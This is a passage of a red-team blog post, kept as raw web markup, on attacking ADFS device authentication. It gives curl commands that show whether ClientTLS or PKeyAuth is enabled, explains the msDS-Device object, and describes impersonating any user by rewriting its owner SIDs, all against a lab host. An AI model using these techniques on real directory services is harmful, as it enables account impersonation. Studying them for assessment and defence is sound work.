(-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*LfTXeYXRqMU00oC2uN0NSQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*LfTXeYXRqMU00oC2uN0NSQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*LfTXeYXRqMU00oC2uN0NSQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*LfTXeYXRqMU00oC2uN0NSQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*LfTXeYXRqMU00oC2uN0NSQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*LfTXeYXRqMU00oC2uN0NSQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*LfTXeYXRqMU00oC2uN0NSQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="587" loading="lazy" role="presentation"/></picture></div></div></figure><p id="64e2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">You have likely come across a few of these options during your engagements. For example, “Forms Authentication” is the presentation of the ADFS login form:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qf"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*2atnvxCAbbc0599Tz493mg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*2atnvxCAbbc0599Tz493mg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*2atnvxCAbbc0599Tz493mg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*2atnvxCAbbc0599Tz493mg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*2atnvxCAbbc0599Tz493mg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*2atnvxCAbbc0599Tz493mg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2atnvxCAbbc0599Tz493mg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*2atnvxCAbbc0599Tz493mg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*2atnvxCAbbc0599Tz493mg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*2atnvxCAbbc0599Tz493mg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*2atnvxCAbbc0599Tz493mg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*2atnvxCAbbc0599Tz493mg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*2atnvxCAbbc0599Tz493mg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*2atnvxCAbbc0599Tz493mg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="458" loading="lazy" role="presentation"/></picture></div></div></figure><p id="9ef8" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">“Windows Authentication” is the NTLM/Kerberos WIA methods that you’ve no doubt tried to relay to in the past, and is only supported on the Intranet.</p><p id="9de7" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">For DRS to function properly, there is the “Device Authentication” option, which needs to be enabled and be accessible via the Extranet/Intranet zones you have access to.</p><p id="51c6" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Device Authentication requires DRS to be enabled, and it isn’t enabled by default unfortunately for us attackers. So again, you are much more likely to see this in either legacy environments, or environments using Hybrid Join.</p><p id="a2ee" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">There are multiple ways that Device Authentication can function depending on the configuration. In ADFS ≥ 2016, we have:</p><ul class=""><li id="6e34" class="mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qg qh qi bk">ClientTLS</li><li id="d26e" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">PRT</li><li id="c0a9" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">PKeyAuth</li></ul><p id="63b4" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The method of Device Authentication is controlled in part by the <code class="cx ns nt nu nv b">Set-AdfsGlobalAuthenticationPolicy</code> PowerShell commandlet:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="7bdf" class="pv nx gu nv b bg pw px l py pz">Set-AdfsGlobalAuthenticationPolicy –DeviceAuthenticationMethod All</span></pre><p id="3665" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Out of the box, ADFS 2012 only supports <code class="cx ns nt nu nv b">ClientTLS</code>. However ADFS ≥ 2016 uses <code class="cx ns nt nu nv b">SignedToken</code></p><p id="fdfc" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So how can we enumerate a tenant to determine the enabled device authentication method? Well it’s mostly a game of elimination. If we want to see if <code class="cx ns nt nu nv b">ClientTLS</code> Device Authentication is enabled for ADFS without having access to the configuration, a <code class="cx ns nt nu nv b">curl</code> request for the endpoint with the <code class="cx ns nt nu nv b">trace</code> argument would reveal this:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="8d37" class="pv nx gu nv b bg pw px l py pz">curl -k &#x27;https://adfs.lab.local/adfs/ls/idpinitiatedsignon.aspx?client-request-id=77de249e-f9b5-4921-c301-0080000000b9&#x27; -v -X POST -d &#x27;SignInIdpSite=SignInIdpSite&amp;SignInSubmit=Sign+in&amp;SingleSignOut=SingleSignOut&#x27; --trace out.txt</span></pre><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qo"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oH2EDM8JBx1SpLvDc9cYBQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*oH2EDM8JBx1SpLvDc9cYBQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*oH2EDM8JBx1SpLvDc9cYBQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*oH2EDM8JBx1SpLvDc9cYBQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*oH2EDM8JBx1SpLvDc9cYBQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*oH2EDM8JBx1SpLvDc9cYBQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*oH2EDM8JBx1SpLvDc9cYBQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*oH2EDM8JBx1SpLvDc9cYBQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="301" loading="lazy" role="presentation"/></picture></div></div></figure><p id="943a" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">We’re looking for <code class="cx ns nt nu nv b">MS-Organization-Access</code> as the CA in the client certificate request (13). If you see this, then <code class="cx ns nt nu nv b">ClientTLS</code> Device Authentication is enabled for the network endpoint you are requesting. And this means if we have the appropriate Device Authentication certificate, we can authenticate to ADFS.</p><p id="776d" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we wanted to check if <code class="cx ns nt nu nv b">PKeyAuth</code> is enabled, we need to make a request with the <code class="cx ns nt nu nv b">;PKeyAuth/1.0</code> string within the <code class="cx ns nt nu nv b">User-Agent</code> string:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="1d63" class="pv nx gu nv b bg pw px l py pz">curl -k &#x27;https://adfs.lab.local/adfs/ls/idpinitiatedsignon.aspx?client-request-id=77de249e-f9b5-4921-c301-0080000000b1&#x27; -v -X POST -d &#x27;SignInIdpSite=SignInIdpSite&amp;SignInSubmit=Sign+in&amp;SingleSignOut=SingleSignOut&#x27; --user-agent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0);PKeyAuth/1.0</span></pre><p id="28ea" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If the response comes back with a <code class="cx ns nt nu nv b">302</code> to <code class="cx ns nt nu nv b">urn:http-auth:PKeyAuth</code> then we know that PKeyAuth is used:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="a7c6" class="pv nx gu nv b bg pw px l py pz">&lt; HTTP/1.1 302 Found<br/>&lt; Content-Length: 0<br/>&lt; Content-Type: text/html; charset=utf-8<br/>&lt; Location: urn:http-auth:PKeyAuth?SubmitUrl=https%3a%2f%2fadfs.lab.local%3a443%2fadfs%2fls%2fidpinitiatedsignon.aspx%3fclient-request-id%3d77de249e-f9b5-4921-c301-0080000000b1&amp;nonce=P5180krdKaElqhmYzkkNYw&amp;Version=1.0&amp;Context=4e5a62d9-12f7-4898-9a4e-f3cd11c65a1a&amp;CertAutho<br/>rities=OU%253d82dbaca4-3e81-46ca-9c73-0950c1eaca97%252cCN%253dMS-Organization-Access%2b%252cDC%253dwindows%2b%252cDC%253dnet%2b&amp;client-request-id=77de249e-f9b5-4921-c301-0080000000b1</span></pre><p id="1ef2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If neither of the above are true, then PRT authentication is in use. We’ll review this option further in the post.</p><p id="497e" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Now that we understand how Device Authentication works, the next question is… where is all this key, certificate, authentication information stored?</p><h1 id="33fd" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">msDS-Device</h1><p id="f3e4" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">You may have come across the <code class="cx ns nt nu nv b">msDS-Device</code> LDAP class, which lives in the <code class="cx ns nt nu nv b">CN=RegisteredDevices,DC=domain,DC=com</code> container:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NgUg5_3o7JO3M9m3MVEeYw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*NgUg5_3o7JO3M9m3MVEeYw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NgUg5_3o7JO3M9m3MVEeYw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NgUg5_3o7JO3M9m3MVEeYw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NgUg5_3o7JO3M9m3MVEeYw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NgUg5_3o7JO3M9m3MVEeYw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NgUg5_3o7JO3M9m3MVEeYw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*NgUg5_3o7JO3M9m3MVEeYw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="334" loading="lazy" role="presentation"/></picture></div></div></figure><p id="5aed" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The <code class="cx ns nt nu nv b">msDS-Device</code> object is a representation of a registered device. Unlike a <code class="cx ns nt nu nv b">Computer</code> object, it isn’t a security principal, but it does contain a number of familiar attributes, such as:</p><ul class=""><li id="35ee" class="mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qg qh qi bk"><code class="cx ns nt nu nv b">altSecurityIdentities</code></li><li id="8596" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk"><code class="cx ns nt nu nv b">msDS-KeyCredentialLink</code></li></ul><p id="8aa4" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">As the <code class="cx ns nt nu nv b">msDS-Device</code> isn’t a security principal, things like “Shadow Credentials” aren’t going to work as there is no identity associated with the device. So what is being stored here?</p><p id="be90" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">In the case of <code class="cx ns nt nu nv b">msDS-Device</code>, the <code class="cx ns nt nu nv b">altSecurityIdentities</code> field is used to store the public key of the Device Authentication certificate we generate during Device Registration.</p><p id="5da3" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">There is also another important field, <code class="cx ns nt nu nv b">msDS-RegisteredOwner</code> which is associated with the SID of the user account used to create the device registration along with <code class="cx ns nt nu nv b">msDS-RegisteredUsers</code>:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div class="pa pb qq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 1100w, https://miro.medium.com/v2/resize:fit:958/format:webp/1*iYWSkN3NYbLctSrdIgaEXQ.png 958w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 479px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*iYWSkN3NYbLctSrdIgaEXQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*iYWSkN3NYbLctSrdIgaEXQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*iYWSkN3NYbLctSrdIgaEXQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*iYWSkN3NYbLctSrdIgaEXQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*iYWSkN3NYbLctSrdIgaEXQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*iYWSkN3NYbLctSrdIgaEXQ.png 1100w, https://miro.medium.com/v2/resize:fit:958/1*iYWSkN3NYbLctSrdIgaEXQ.png 958w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 479px"/><img alt="" class="bh mb pn c" width="479" height="545" loading="lazy" role="presentation"/></picture></div></figure><p id="46b0" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This is where things diverge slightly depending on the authentication method we commented on above. If <code class="cx ns nt nu nv b">ClientTLS</code> is in use, and we authenticate with the certificate used during device registration, the user account that you are authenticated to ADFS as will be the SID of these fields. This isn’t the case if <code class="cx ns nt nu nv b">SignedToken</code> is used, so I believe that this is an example of an older version of ADFS device registration before PRT’s become the norm.</p><p id="0732" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This also means that if during your assessment you find yourself with write permission over a <code class="cx ns nt nu nv b">msDS-Device</code> object (and Device Authentication is enabled with <code class="cx ns nt nu nv b">ClientTLS</code>), you have the ability to authenticate to ADFS as any principal by updating both the <code class="cx ns nt nu nv b">msDS-RegisteredOwner</code> and <code class="cx ns nt nu nv b">msDS-RegisteredUsers</code> fields to point to the SID of any user.</p><p id="1c53" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">As I mentioned above, the <code class="cx ns nt nu nv b">msDS-Device</code> is created and fields are populated during Device Registration. Let’s take a look at the authentication process for how a device actually becomes registered.</p><h1 id="4c19" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Creating a DRS Access Token</h1><p id="8cf8" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">To authenticate against DRS, we need an OAuth2 access token. The DRS client ID we observed in the disassembly at the start of the post is “public”, meaning that there aren’t any OAuth2 secrets to know when making a request.</p><p id="2d4b" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">We can validate this by using the <code class="cx ns nt nu nv b">Get-AdfsClient</code> commandlet:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*43vc3ba2t1Tdl9RtDGjZDg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*43vc3ba2t1Tdl9RtDGjZDg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*43vc3ba2t1Tdl9RtDGjZDg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*43vc3ba2t1Tdl9RtDGjZDg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*43vc3ba2t1Tdl9RtDGjZDg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*43vc3ba2t1Tdl9RtDGjZDg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*43vc3ba2t1Tdl9RtDGjZDg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*43vc3ba2t1Tdl9RtDGjZDg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="206" loading="lazy" role="presentation"/></picture></div></div></figure><p id="2991" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">We can also see the supported <code class="cx ns nt nu nv b">RedirectUri</code> required for authentication.</p><p id="b981" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So if we are in a scenario where we have valid credentials for an account on ADFS, we can start the DRS client OAuth2 flow with:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="7969" class="pv nx gu nv b bg pw px l py pz">GET /adfs/oauth2/authorize?response_type=code&amp;<br/>client_id=dd762716-544d-4aeb-a526-687b73838a22&amp;<br/>resource=urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A&amp;<br/>redirect_uri=ms-app://windows.immersivecontrolpanel/ HTTP/1.1<br/>Host: adfs.lab.local</span></pre><p id="d5fd" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This will start the authorisation code flow and, depending on the Authentication Methods enabled, we can login with credentials to create a OAuth2 auth code. If we successfully authenticate, we’ll see the <code class="cx ns nt nu nv b">code</code> parameter passed back to our redirect URI:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2_lO5Qj_1mT963P_OilkpA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*2_lO5Qj_1mT963P_OilkpA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*2_lO5Qj_1mT963P_OilkpA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*2_lO5Qj_1mT963P_OilkpA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*2_lO5Qj_1mT963P_OilkpA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*2_lO5Qj_1mT963P_OilkpA.png 828w, 